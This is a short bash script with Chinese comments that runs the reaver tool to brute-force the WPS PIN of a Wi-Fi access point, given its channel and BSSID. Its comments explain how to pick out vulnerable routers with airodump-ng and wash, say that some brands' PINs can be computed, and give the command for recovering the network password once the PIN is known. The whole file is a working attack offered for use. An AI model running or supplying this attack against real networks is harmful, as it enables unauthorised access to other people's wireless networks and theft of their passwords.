#!/bin/bash -

test "$2" || {
                echo '$1 为channel号, $2为AP的BSSID(即MAC)'
                exit 1
             }

#AP必须开启wps功能, 现在很多都是防pin路由器或有300秒pin限制.
#判断一个wifi信号是否开启了wps, 从而可以被探测出pin码:
#1. airodump-ng : MB项中的 54e. 和 54e , 若为 54e. 的就可以探测pin
#2. wash -i mon0 -C : wps locked那列, yes的就可以探测pin
#3. 特殊路由的pin码可以通过计算得出, 如腾达和磊科
#如果已知了pin码, 可: reaver -i mon0 -b BSSID -p pin码 来得到密码

#穷举pin码, 大约要2-4个小时
reaver -i mon0 -c "$1" -b "$2" -a -S -d 9 -t 8 -vv

